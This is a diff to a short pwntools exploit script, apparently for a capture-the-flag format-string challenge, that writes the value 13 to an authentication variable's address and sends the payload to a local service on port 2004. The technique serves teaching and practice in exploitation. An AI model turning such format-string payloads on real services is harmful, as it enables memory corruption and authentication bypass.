@@ -1,14 +1,13 @@
 from pwn import *
+# context.binary = ELF('./fmt1')
 
-context.binary = ELF('./fmt1')
-AUTH_ADDR = 0x404048
+# Depending on your machine, the fmtstr_payload may differ
+context.arch = "x86_64"
+AUTH_ADDR = 0x404050
 def solve():
-    p = process()
+    # p = process()
+    p = remote("localhost", 2004)
     payload = fmtstr_payload(6, {AUTH_ADDR : 13})
-    #payload = p64(AUTH_ADDR)
-    #payload += b'|' * 5         # We need to write the value 13, AUTH is 8 bytes, so we need 5 more for %n
-    #payload += b'%6$n'
-    print("payload:", payload)
     with open('input.txt', 'wb') as f:
         f.write(payload)
     p.sendline(payload)
